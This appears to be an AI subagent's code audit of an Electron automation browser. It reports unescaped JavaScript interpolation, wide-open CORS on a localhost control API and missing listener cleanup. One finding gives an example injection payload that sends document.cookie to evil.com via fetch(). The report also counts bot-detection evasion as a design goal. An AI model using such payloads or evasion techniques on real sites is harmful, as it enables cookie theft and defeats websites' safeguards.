# Tandem Browser — Code Audit Report
**Date:** 2026-02-11  
**Auditor:** Subagent (senior code auditor)  
**Codebase:** ~8,900 lines TypeScript + ~3,500 lines HTML/JS (shell)

## Summary

| Category | Status |
|---|---|
| TypeScript compilation | ✅ Zero errors |
| Branch merges | ✅ Main is already a superset of all branches |
| Applied stashed ClaroNote UI improvements | ✅ Committed & pushed |
| Security | ⚠️ 2 critical, 2 moderate issues |
| Anti-detection | ⚠️ 1 critical violation |
| Error handling | ✅ Good — every API endpoint has try/catch |
| Performance | ⚠️ 2 moderate issues |

---

## Branch Merge Status

- **`feature/claronote-native`** — Already integrated into main (commit `71fc9d6`). Branch has no unique commits beyond what main contains. No merge needed.
- **`feature/phase6-polish`** — Zero commits ahead of main. No merge needed.
- **`feature/phase5-openclaw`** — Already merged (confirmed).
- **Stash@{0}** — Applied ClaroNote UI improvements (MediaRecorder support, waveform visualization, code cleanup). Committed as `5af6ae3`.

---

## Critical Issues

### 1. 🔴 JS Injection via String Interpolation in Workflow Engine
**File:** `src/workflow/engine.ts` (lines 427, 434, 459, 467, 480, 496, 538, 564, 569, 594, 598)

All `executeJavaScript` calls use unescaped string interpolation:
```ts
document.querySelector('${step.params.selector}')
document.body.textContent.includes('${step.params.text}')
```

If a workflow step contains a malicious selector like `'); fetch('http://evil.com/steal?c='+document.cookie); ('`, it executes in the webview context. This is a **remote code execution** risk if workflows can be loaded from external sources.

**Fix:** Use `JSON.stringify()` for all interpolated values (like `humanized.ts` already does correctly).

### 2. 🔴 Anti-Detection Violation: `dispatchEvent` in Webview
**File:** `src/workflow/engine.ts` (line 487)

```ts
const event = new KeyboardEvent('keydown', { key: 'Enter', keyCode: 13 });
element.dispatchEvent(event);
```

This produces `isTrusted: false` events, directly violating the anti-detection architecture. Websites can detect this.

**Fix:** Use `sendInputEvent` via the main process (like `humanizedClick`/`humanizedType` do).

### 3. 🔴 CORS is Wide Open
**File:** `src/api/server.ts` (line 96)

```ts
this.app.use(cors());
```

While the API binds to `127.0.0.1`, the permissive CORS means **any website** can make requests to `localhost:8765` from JavaScript. A malicious website could:
- Read browsing history via `/history/search`
- Extract saved form data (including encrypted passwords) via `/forms/*`  
- Control the browser via `/click`, `/type`, `/navigate`
- Read ClaroNote credentials

**Fix:** Restrict CORS to only allow requests from `file://` and specific localhost origins, or require an auth token.

---

## Moderate Issues

### 4. ⚠️ Silent Error Swallowing
**Files:** `src/main.ts`, `src/watch/watcher.ts`, `src/headless/manager.ts`

11 instances of `.catch(() => {})` silently swallowing errors. While some are intentional (stealth script injection), others could hide real bugs:
- `siteMemory.recordVisit()` failures
- `contextBridge.recordSnapshot()` failures  

**Recommendation:** At minimum, log to console.warn for debugging.

### 5. ⚠️ No Event Listener Cleanup
Zero calls to `removeListener`/`removeEventListener`/`removeAllListeners` across the entire codebase. Event listeners registered in `main.ts` (IPC handlers, `app.on('web-contents-created')`) are never cleaned up. This could cause memory leaks on window recreation (macOS `activate` event).

### 6. ⚠️ Workflow Engine Click/Type Don't Use Humanized Functions
**File:** `src/workflow/engine.ts`

The `executeClick` and `executeType` methods use raw `executeJavaScript` with `el.focus()` and DOM manipulation instead of the existing `humanizedClick`/`humanizedType` functions from `src/input/humanized.ts`. This:
- Violates anti-detection (programmatic events)
- Bypasses humanized timing
- Duplicates functionality

---

## Positive Findings

1. **Electron security** — All windows use `contextIsolation: true`, `nodeIntegration: false` ✅
2. **API binding** — Correctly bound to `127.0.0.1` only ✅
3. **Stealth architecture** — Main process injection via `executeJavaScript` from main process, `sendInputEvent` for user simulation ✅
4. **Error handling** — All 111 API endpoints have try/catch with JSON error responses ✅
5. **Encryption** — Form passwords encrypted with AES-256-GCM, key generated locally ✅
6. **Strict TypeScript** — `strict: true` in tsconfig ✅
7. **Input validation** — Most endpoints validate required params, use `as string` casts ✅
8. **Request size limit** — `express.json({ limit: '50mb' })` prevents unbounded payloads ✅
9. **Partition isolation** — All webviews use `persist:tandem` partition ✅
10. **No hardcoded secrets** — No tokens/keys in source code ✅

---

## Minor / Informational

- **`@types/turndown` in dependencies** — Should be in `devDependencies`
- **23 constructor parameters** for `TandemAPI` — Consider using an options/context object
- **Old stashes** — 5 remaining stashes from various branches (stash@{0}..@{4}), can be cleaned up with `git stash drop`
- **No TODO/FIXME comments** — Clean codebase, no forgotten work items in code

---

## Final State

```
✅ npx tsc — zero errors
✅ git push origin main — up to date (commit 5af6ae3)
✅ All feature branches already integrated into main
```
